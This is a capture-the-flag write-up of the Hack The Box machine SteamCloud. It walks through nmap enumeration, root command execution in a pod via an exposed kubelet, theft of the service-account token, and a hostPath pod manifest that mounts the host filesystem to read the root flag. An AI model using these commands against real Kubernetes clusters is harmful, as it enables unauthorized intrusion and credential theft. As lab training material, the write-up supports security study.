---
title: "SteamCloud from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# SteamCloud from HTB
`nmap`gave this
```bash
PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open     ssl/etcd-client?
| tls-alpn:
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2024-08-17T21:22:42
|_Not valid after:  2025-08-17T21:22:42
|_ssl-date: TLS randomness does not represent time
2380/tcp  open     ssl/etcd-server?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2024-08-17T21:22:42
|_Not valid after:  2025-08-17T21:22:43
| tls-alpn:
|_  h2
|_ssl-date: TLS randomness does not represent time
8443/tcp  open     ssl/https-alt
| tls-alpn:
|   h2
|_  http/1.1
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 403 Forbidden
|     Audit-Id: b801c3c4-fb92-45c9-a786-1a3196551e3f
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 182bbb32-c502-4451-a14f-cc7dbe305194
|     X-Kubernetes-Pf-Prioritylevel-Uid: f4de25b0-df3f-4fc5-a742-ddf7350d87a1
|     Date: Sat, 17 Aug 2024 21:26:15 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest:
|     HTTP/1.0 403 Forbidden
|     Audit-Id: cf0421c6-ba98-4e3d-8f1d-fb852c5b7f57
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 182bbb32-c502-4451-a14f-cc7dbe305194
|     X-Kubernetes-Pf-Prioritylevel-Uid: f4de25b0-df3f-4fc5-a742-ddf7350d87a1
|     Date: Sat, 17 Aug 2024 21:26:12 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions:
|     HTTP/1.0 403 Forbidden
|     Audit-Id: be215632-cb1d-4164-8f9c-bab1b334f1eb
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 182bbb32-c502-4451-a14f-cc7dbe305194
|     X-Kubernetes-Pf-Prioritylevel-Uid: f4de25b0-df3f-4fc5-a742-ddf7350d87a1
|     Date: Sat, 17 Aug 2024 21:26:13 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2024-08-16T21:22:41
|_Not valid after:  2027-08-17T21:22:41
|_http-title: Site doesn't have a title (application/json).
10249/tcp open     http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open     ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=steamcloud@1723929764
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2024-08-17T20:22:44
|_Not valid after:  2025-08-17T20:22:44
10256/tcp open     http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
```
Reading all this we get that site is running `kubernetes`and to explore that we'll need
https://github.com/cyberark/kubeletctl
```bash
sudo wget https://github.com/cyberark/kubeletctl/releases/download/v1.12/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```
Then start exploring.
```bash
kubeletctl --server 10.10.11.133 pods
```
With this you will list all `pods`there is.
We'll need
```
├───┼────────────────────────────────────┼─────────────┼─────────────────────────
│ 5 │ nginx                              │ default     │ nginx
├───┼────────────────────────────────────┼─────────────┼─────────────────────────
```
Then check where we can do `RCE`in those `pods`
```
kubeletctl scan rce --server 10.10.11.133
├───┼──────────────┼────────────────────────────────────┼─────────────┼────────
│ 5 │              │ nginx      │ default     │ nginx | +
├───┼──────────────┼────────────────────────────────────┼─────────────┼──────
```
We can do `RCE`in `nginx`
```bash
kubeletctl exec "id" -p nginx -c nginx --server 10.10.11.133
uid=0(root) gid=0(root) groups=0(root)
```
We are `root`that's good.
User Flag is in `/root`
```bash
kubeletctl exec "ls /root" -p nginx -c nginx --server 10.10.11.133
user.txt
```
***
User Flag is: c9469d2a6de00e610e724285bf6935e0
***
we'll need tokens so let's grab it:
```bash
kubeletctl exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx --server 10.10.11.133

kubeletctl exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx --server 10.10.11.133
```
Save the `ca.crt`as file
and `token`as `variable`
```
export token="eyJhbGciOiJSUzI1NiIsImtpZCI6............"
```
Then use `kubectl`to list directories with certificates
```bash
kubectl --token=$token --certificate-authority=ca.cert --server=https://10.10.11.133:8443 get pods
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          33m
```
Then what can we do, what permissions do we have:
```bash
kubectl --token=$token --certificate-authority=ca.cert --server=https://10.10.11.133:8443 auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
```
This means we can do all things in `default`namespace
Now we have to make an `pod`
Create file named `<whatYouWant>.yaml`
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
    - name: nginxt
      image: nginx:1.14.2
      volumeMounts:
        - mountPath: /root
          name: mount-root-into-mnt
  volumes:
    - name: mount-root-into-mnt
      hostPath:
         path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
Then upload it like this:
```bash
kubectl --token=$token --certificate-authority=ca.cert --server=https://10.10.11.133:8443 apply -f <name>.yaml
```
Then use that uploaded namespace to get Root Flag`
```bash
kubeletctl exec "cat /root/root/root.txt" -p nginxt -c nginxt --server 10.10.11.133
```
![](/assets/images/Screenshot from 2024-08-18 02-06-19.png)
